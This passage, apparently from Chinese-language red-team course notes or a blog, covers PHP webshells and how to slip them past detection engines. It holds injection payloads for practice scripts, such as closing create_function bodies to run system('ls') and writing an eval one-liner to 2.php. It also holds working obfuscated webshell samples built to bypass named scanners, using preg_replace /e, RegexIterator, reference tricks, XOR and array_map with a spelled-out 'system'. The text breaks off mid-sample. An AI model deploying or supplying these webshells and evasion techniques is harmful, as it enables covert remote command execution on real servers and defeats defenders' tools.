php"><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>这里$a为函数，’ ‘为参数</p><p>那么可以看作为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; &#x27;</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>传入payload</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">b</span><span class="hljs-operator">=</span> <span class="hljs-comment">;&#125;phpinfo();/*</span><br></code></pre></td></tr></table></figure><p>在function函数中即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; &#x27;</span> ;&#125;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">/*</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><p>后面的内容注释掉了，即执行命令<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231643426.png" alt="图片"></p><p>3.php</p><p>跟上面一样，虽然有一点变形，但是再$b的打印上没有特殊之处，所以payload:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">d</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;&#125;system(%27ls%27);/*</span><br></code></pre></td></tr></table></figure><p>4.php</p><p>没什么特别之处，assert直接作为函数执行，payload:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?b=<span class="hljs-keyword">system</span>(%27ls;%27)<br></code></pre></td></tr></table></figure><p>5.php</p><p>*<em>call_user_func()*<em>函数的特点，知道后面的后面的*<em>为参数，前面的</em></em></em>*a**为函数即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">b</span>=system&amp;c=whoami<br></code></pre></td></tr></table></figure><p>6.php</p><p>基本上属于3的内容加强版，重点就是需要进行闭合，，代码变多了，payload没有出入，重点还是再**$code**的位置</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?a=<span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">system</span>(%27ls%27);<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>7.php</p><p>属于加强版本，**$sort_function<strong>的内容进行闭合，也就是</strong>sort_by**的参数值要实现闭合，构造payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?sort_by=%27<span class="hljs-string">&quot;]);&#125;system(%27whoami%27);/*</span><br></code></pre></td></tr></table></figure><p>8.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=<span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);%<span class="hljs-number">20</span><span class="hljs-meta">?&gt;</span>%<span class="hljs-number">20</span>&gt;<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure><p>一句话木马写入2.php</p><p>也有其它解法直接进行命令执行。</p><h2 id="手动带他们进行分析"><a href="#手动带他们进行分析" class="headerlink" title="手动带他们进行分析"></a>手动带他们进行分析</h2><p>20220405.php</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br><span class="hljs-built_in">create_function</span>()用于在PHP中创建匿名(lambda-style)函数。可用于代码注入<br>array转化成数组<br><span class="hljs-keyword">@extract</span>把客户端表单中的变量名取出来<br>hello 写在闭合之后让php解析不了以为这个是个非php文件  <br><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231729906.png" alt="image-20220523172916521">看不出来<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231734653.png" alt="image-20220523173415568"></p><p>证明我们直接写的b就是引用了 create_function(null,fun2());<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231736607.png" alt="image-20220523173645546"></p><p>所以这个array是解析不出来引用的create_function，所以这个就需要extract的注释。而这个extrct估计就是来绕过的<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231742999.png" alt="image-20220523174231931"></p><p>因为extract的原因所以看不了</p><h2 id="根据p神文章自写木马"><a href="#根据p神文章自写木马" class="headerlink" title="根据p神文章自写木马"></a>根据p神文章自写木马</h2><h3 id="利用修饰符e-php5-6-40"><a href="#利用修饰符e-php5-6-40" class="headerlink" title="利用修饰符e  php5.6.40"></a>利用修饰符e  php5.6.40</h3><p>PHP旧版本的preg类函数中存在一个修饰符 e ，&#x3D;&#x3D;增加了这个修饰符后，替换后的结果将会被放进eval执行&#x3D;&#x3D;。利用这个方法，即可构造一个不带eval关键字的Webshell，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/.*/e&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>])<br></code></pre></td></tr></table></figure><p>其实原理很简单，我们查看PHP文档可以发现， preg_replace 的第一个参数是支持传入字符串或数组的：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231754170.png" alt="image-20220523175432082"></p><p>而我猜测检测引擎后端是只考虑了字符串的情况。所以，我使用下面这个简单的样本就绕过了QT引擎：</p><p>111.php?2&#x3D;phpinfo();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">preg_replace</span>([<span class="hljs-string">&#x27;/.*/e&#x27;</span>], <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_replace 函数执行一个正则表达式的搜索和替换。<br><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br><span class="hljs-variable">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。<br><span class="hljs-variable">$replacement</span>: 用于替换的字符串或字符串数组。<br><span class="hljs-variable">$subject</span>: 要搜索替换的目标字符串或字符串数组。<br>如果 subject 是一个数组， <span class="hljs-title function_ invoke__">preg_replace</span>() 返回一个数组， 其他情况下返回一个字符串。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232041211.png" alt="image-20220523204153105"></p><h3 id="那么我们也可以利用e修饰符。"><a href="#那么我们也可以利用e修饰符。" class="headerlink" title="那么我们也可以利用e修饰符。"></a>那么我们也可以利用e修饰符。</h3><p>样本简化之后如下：&#x3D;&#x3D;php 5.6.9&#x3D;&#x3D; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>([<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]]); <br><br><span class="hljs-variable">$i</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegexIterator</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;regexp&quot;</span>],<span class="hljs-title class_">RegexIterator</span>::<span class="hljs-variable constant_">REPLACE</span>); <br><br><span class="hljs-variable">$i</span>-&gt;replacement=<span class="hljs-string">&#x27;$0&#x27;</span>; <br><br><span class="hljs-title function_ invoke__">iterator_to_array</span>(<span class="hljs-variable">$i</span>); <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>222.php</p><p>?cmd&#x3D;phpinfo();&amp;regexp&#x3D;&#x2F;(.*)&#x2F;e<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231953862.png" alt="image-20220523195317562"></p><p>原理很简单， php 将各类 preg 函数包装成了一个正则的迭代器类<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231922869.png" alt="image-20220523192234575"></p><p>从底层代码上看，当 RegexIterator 的操作模式为 RegexIterator::REPLACE 时会和</p><p>preg_repalce 一样，会走到 php_pcre_replace_impl 来处理正则表达式，如果正则表达式中有e修</p><p>饰符会走到 preg_do_eval 进行命令执行</p><p>行</p><p>RegexIterator ：<a href="https://github.com/php/php-src/blob/83610987046d5a5ffea2777853d4a4f2d3313387/ext/spl/spl_iterators.c#L1922">https://github.com/php/php-src/blob/83610987046d5a5ffea2777853d4a4f2d3313387/ext/spl/spl_iterators.c#L1922</a></p><p>preg_repalce ：<a href="https://github.com/php/php-src/blob/c0d890e918ff7b4212ef5a2e118a165f2c8eda39/ext/pcre/php_pcre.c#L1156">https://github.com/php/php-src/blob/c0d890e918ff7b4212ef5a2e118a165f2c8eda39/ext/pcre/php_pcre.c#L1156</a></p><p>PS：这类利用方法还有 RecursiveRegexIterator （ RegexIterator 的子类）</p><h3 id="类型转换打断检测引擎正常执行"><a href="#类型转换打断检测引擎正常执行" class="headerlink" title="类型转换打断检测引擎正常执行"></a>类型转换打断检测引擎正常执行</h3><p>333.php</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$cmd = [<span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, ...$_GET[1], <span class="hljs-string">&#x27;watermelon&#x27;</span>]<span class="hljs-comment">; 1</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231946938.png" alt="image-20220523194613984">因此我猜测可能在动态检测的时候由于⽆法知道参数的值，动态执⾏的时候也会爆出此错误，导致代码 </p><p>不能执⾏下去，so如果我们可以找到其他的⽅法，通过传⼊参数的差异来打断动态执⾏，应该就可以绕 </p><p>过，我的思路是通过过set_error_handler捕获warrning抛出致命错误，</p><p>?x&#x3D;1&amp;1&#x3D;id</p><h3 id="php引用-php-lt-8"><a href="#php引用-php-lt-8" class="headerlink" title="php引用  php&lt;8"></a>php引用  php&lt;8</h3><p>其实这个问题最早在20多年前就被开发者提出了：<strong><a href="https://bugs.php.net/bug.php?id=6417">https://bugs.php.net/bug.php?id=6417</a></strong>，并且在后面几年一直有开发者在 php-bug 和手册的 note 中提及：</p><p><strong><a href="https://bugs.php.net/bug.php?id=6417">https://bugs.php.net/bug.php?id=6417</a></strong> </p><p><strong><a href="https://bugs.php.net/bug.php?id=7412">https://bugs.php.net/bug.php?id=7412</a></strong> </p><p><strong><a href="https://bugs.php.net/bug.php?id=15025">https://bugs.php.net/bug.php?id=15025</a></strong> </p><p><strong><a href="https://bugs.php.net/bug.php?id=20993">https://bugs.php.net/bug.php?id=20993</a></strong> </p><p><em><a href="https://www.php.net/manual/zh/language.references.php">https://www.php.net/manual/zh/language.references.php</a></em></p><p>直到 php8 该“问题”还是依旧存在，没有修复的原因是因为 PHP 官方不认为是一个 bug ，并给出的解释</p><p>是：</p><p><strong>由于</strong> PHP <strong>内部工作的特殊性，如果对数组的单个元素进行引用，然后复制数组，无论是通过赋值还是通</strong></p><p><strong>过函数调用中的值传递，都会将引用复制为数组的一部分。这意味着对任一数组中任何此类元素的更改</strong></p><p><strong>都将在另一个数组（和其他引用中）中重复，即使数组具有不同的作用域（例如，一个是函数内部的参</strong></p><p><strong>数，另一个是全局的）！在复制时没有引用的元素，以及在复制数组后分配给其他元素的引用，将正常</strong></p><p><strong>工作（即独立于其他数组）。</strong></p><p>444.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-string">&quot;A&quot;</span>); <span class="hljs-variable">$b</span>=&amp;<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]; <span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>; <span class="hljs-variable">$c</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;mem&quot;</span>]]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]; <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>?mem&#x3D;1&amp;cmd&#x3D;phpinfo();<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231951324.png" alt="image-20220523195127231"></p><h3 id="pcre-get-compiled-regex-cache-函数"><a href="#pcre-get-compiled-regex-cache-函数" class="headerlink" title="pcre_get_compiled_regex_cache 函数"></a>pcre_get_compiled_regex_cache 函数</h3><p>我很快关注到了这个 pcre_get_compiled_regex_cache 函</p><p>数，这个函数用于处理 preg_replace 的第一个参数</p><p>555.php?2333&#x3D;phpinfo();<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232002424.png" alt="image-20220523200242323"></p><p>我省略了很多，因为这些代码前面的注释足以说明他们的作用。</p><p>第一段注释，说明了解析正则的时候会忽略掉正则前面所有的空白字符</p><p>第二段注释，说明delimiter不能是字母、数字或者反斜线。</p><p>30delimiter就是正则里的分隔符，比如 &#x2F;.*&#x2F;e 这个正则，它的delimiter是 &#x2F; 。很显然，delimiter是</p><p>有两个的，分别是start_delimiter和end_delimiter。</p><p>第三段注释，当 start_delimiter &#x3D;&#x3D; end_delimiter 时，分隔符只有一个符号。</p><p>第四段注释，当 start_delimiter !&#x3D; end_delimiter 时，分隔符有两个符号。</p><p>第四段就是有趣的点了，我们平时日常开发或审计的过程中，通常遇到的正则表达式分隔符，要不就是</p><p>斜线 &#x2F; ，要不就是竖线 | ，也有见过井号 # 、波浪线 ~ 之类的，但甭管怎样他们都属于</p><p>start_delimiter &#x3D;&#x3D; end_delimiter 这种情况。</p><p>但PHP的正则是支持使用“括号”这种成对出现的符号作为分隔符的，只要正则两侧的分隔符能够组成一对都是合法分隔符，比如：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232005344.png" alt="image-20220523200531695">这种比较奇葩的正则表达式分隔符，如果Webshell检测引擎没有正确地进行解析，就有可能被绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;&lt;.*&gt;e&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>]); <br></code></pre></td></tr></table></figure><h3 id="以在多个修饰符间，添加一些没意义的空白字符"><a href="#以在多个修饰符间，添加一些没意义的空白字符" class="headerlink" title="以在多个修饰符间，添加一些没意义的空白字符"></a>以在多个修饰符间，添加一些没意义的空白字符</h3><p>实际上是阅读底层函数 pcre_get_compiled_regex_cache 的代码，来到后面一个while循环中：</p><p>这个switch语句显然就是用来处理各种修饰符的。</p><p>可以观察到，switch里对空格和换行进行了匹配，如果遇到这两个字符直接break忽略，进入下一次循环</p><p>也就是说，我们可以在多个修饰符间，添加一些没意义的空白字符，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;/.*/\ne\n\n is\n &quot;</span>; <br><br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>]); <br></code></pre></td></tr></table></figure><p>666.php?2333&#x3D;phpinfo();</p><h3 id="RegexIterator-这个类"><a href="#RegexIterator-这个类" class="headerlink" title="RegexIterator 这个类"></a>RegexIterator 这个类</h3><p>这个SPL类用于将一个普通迭代器变成一个具有正则功能的迭代</p><p>器。而正则的模式、方法等都是可以在这个类对象中指定的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$i</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegexIterator</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>]), <span class="hljs-string">&#x27;/.*/e&#x27;</span>, <br><br><span class="hljs-title class_">RegexIterator</span>::<span class="hljs-variable constant_">REPLACE</span>); <br><br><span class="hljs-variable">$i</span>-&gt;replacement = <span class="hljs-string">&#x27;$0&#x27;</span>; <br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$i</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$a</span>) &#123;&#125; <br></code></pre></td></tr></table></figure><p>这种是连不了的 因为这个函数没有回显 request就是在封装的时候用的  当get和post 不能用的时候可以用request </p><p>如果你要当成连接的话 就需要使用eval 那就要做eval的免杀 那还用这个干嘛</p><h3 id="666-php-多重异或"><a href="#666-php-多重异或" class="headerlink" title="666.php  多重异或"></a>666.php  多重异或</h3><p>PHP代码下面的“^”是异或运算符，按二进制位进行异或运算（XOR）</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>^ <span class="hljs-number">0</span> = <span class="hljs-number">0</span>;<br><span class="hljs-symbol">1 </span>^ <span class="hljs-number">1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-symbol">0 </span>^ <span class="hljs-number">1</span> = <span class="hljs-number">1</span>; <br><span class="hljs-symbol">1 </span>^ <span class="hljs-number">0</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p> C:\Users\e’e’t\Desktop\红队安全开发\免杀马的制作\php\备课\20220523写\666.php<br> 多次异或过waf 基本上配合其他方式二次开发 都能<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241604615.png" alt="image-20220524160427493"></p><h3 id="按位取反"><a href="#按位取反" class="headerlink" title="按位取反"></a>按位取反</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241612509.png" alt="image-20220524161253443"></p><p>这么明显的一句话 只爆了一级。<br> 我们在随便加个函数调用一下<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241614659.png" alt="image-20220524161427601"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241634454.png" alt="image-20220524163432377"></p><ul><li><h4 id="2-momek9fW的对应base64解密值为：eval-，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以-GET-0-为空。2-base加密的那一串是作为后面完整的php语句来执行的，结束得加一个-，不然会报错。这样改：echo-base64-encode-’eval-GET-0-’-除了一些小细节作者没处理好之外，单论免杀思路还是不错的。"><a href="#2-momek9fW的对应base64解密值为：eval-，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以-GET-0-为空。2-base加密的那一串是作为后面完整的php语句来执行的，结束得加一个-，不然会报错。这样改：echo-base64-encode-’eval-GET-0-’-除了一些小细节作者没处理好之外，单论免杀思路还是不错的。" class="headerlink" title="2.momek9fW的对应base64解密值为：eval()，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以$_GET[0]为空。2.base加密的那一串是作为后面完整的php语句来执行的，结束得加一个;，不然会报错。这样改：echo(base64_encode(~’eval($_GET[0]);’));除了一些小细节作者没处理好之外，单论免杀思路还是不错的。"></a>2.momek9fW的对应base64解密值为：eval()，因为双引号括起来的字符串会被先解译一遍，你当时没传入值，所以$_GET[0]为空。2.base加密的那一串是作为后面完整的php语句来执行的，结束得加一个;，不然会报错。这样改：echo(base64_encode(~’eval($_GET[0]);’));除了一些小细节作者没处理好之外，单论免杀思路还是不错的。</h4></li></ul><p>单纯知识因为D盾更新遇到base加密的都会报错 那么完全可以配合其它方法 或者使用自己写的加密解密脚本</p><p>最后在放到加密网站加密一下就行</p><h1 id="20220811补充"><a href="#20220811补充" class="headerlink" title="20220811补充"></a>20220811补充</h1><p>现如今的情况下，传统的Webshell检测对于0day样本的检测效率已经不是特别好了，所以这时候就需要一种”主动”的检测方式，能够让引擎主动去理解脚本、分析样本，发现样本中的恶意行为，而不是依靠人工来添加Webshell特征。</p><p>1、污点追踪</p><p>举个例子，对于一个Webshell来说，如果要进行任意命令执行，就一定要获取外界数据，对于PHP来说也就是$_GET、$_POST来接受数据，而要想任意命令执行，这些接收到的数据也就一定要最终传递到eval、system等函数中，而<strong>污点追踪</strong>技术就是利用这一点，如果样本中的外界变量通过不断传递，最终进入到危险函数中，那基本上就可以断定为Webshell，将外界变量视为污点源，危险函数视为污点汇聚点，跟踪污点传播过程，判断污点变量是否被洗白，最终是否进入污点汇聚点，画一个流程图如下：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111049430.png" alt="图片"></p><p>2、词法分析</p><p>检测引擎会将各种脚本语言进行词法语法分析，然后构建控制流图和数据流图，并在图上跟踪外界污点变量的传递，使用外界变量是WebShell非常重要的特征，如果发现外界变量最终进入了命令执行函数，就可以判断为Webshell。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111049452.png" alt="图片"></p><p>我们要知道原理就可以想办法如何“蒙骗“住检测引擎，如果大家研究过，或者说亲身参与到了bypass挑战赛中，就能感受到无论是动静态还是什么技术，最后都是根据污点追踪法则来进行检测，污点追踪的流程在上一节提到了，目前我们有两个方法：</p><p>1、利用PHP中其他的命令执行的方法，让检测引擎识别不出这是污点汇集点</p><p>2、打断污点追踪的过程，让污点汇集点不落地</p><p>前面的很多下项目也是根据这两个方法</p><h2 id="样本一"><a href="#样本一" class="headerlink" title="样本一"></a>样本一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//ASRC伏魔引擎bypass</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">array_diff</span>([<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;ys&quot;</span>,<span class="hljs-string">&quot;te&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>],[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>]);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$a</span>,(<span class="hljs-keyword">array</span>)<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先我们需要利用技巧（PHP本身的特性），来阻断污点追踪的过程，我在fuzz测试的时候发现了array_map()这个函数&#x3D;&#x3D;存在callback并且能够逃避检测&#x3D;&#x3D;</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111053866.png" alt="图片"></p><p>那么首先的能够bypass的污点汇集点已经有了&#x3D;&#x3D;，接下里来就是寻找其他函数来将变量”洗白&#x3D;&#x3D;”，我选择了array_diff()<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111054436.png" alt="图片"></p><p>这样就可以&#x3D;&#x3D;利用该函数拼凑出一个system函数&#x3D;&#x3D;，再&#x3D;&#x3D;利用array_map()的callback&#x3D;&#x3D;&#x3D;&#x3D;来做命令执行&#x3D;&#x3D;</p><p>这样就完成了最简单的一次bypass</p><h2 id="样本2"><a href="#样本2" class="headerlink" title="样本2"></a><em>样本2</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//bypass 牧云 文件名需要设置为system</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-keyword">__FILE__</span>,-<span class="hljs-number">10</span>,<span class="hljs-number">6</span>);<br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$filename</span>(<span class="hljs-variable">$command</span>);<br></code></pre></td></tr></table></figure><p>__FILE__是PHP的一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名，我们利用substr()函数逆着截取，就能获得system再利用变量做函数的方式，打断了污点追踪的过程，进行命令执行，也可以成功bypass掉牧云引擎。</p><h2 id="样本3"><a href="#样本3" class="headerlink" title="样本3"></a><em>样本3</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//bypass 牧云 and TAV反病毒引擎+洋葱恶意代码检测引擎</span><br>classA&#123;<br>    <span class="hljs-title function_ invoke__">publicfunction__construct</span>()&#123;&#125;<br><br>    <span class="hljs-title function_ invoke__">publicfunction__wakeup</span>()&#123;<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">array_diff</span>([<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;ys&quot;</span>,<span class="hljs-string">&quot;te&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>],[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>]);<br>        <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-title class_">Closure</span>::<span class="hljs-title function_ invoke__">fromCallable</span>(<span class="hljs-variable">$a</span>)-&gt;<span class="hljs-title function_ invoke__">__invoke</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>]);<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:10:&quot; A 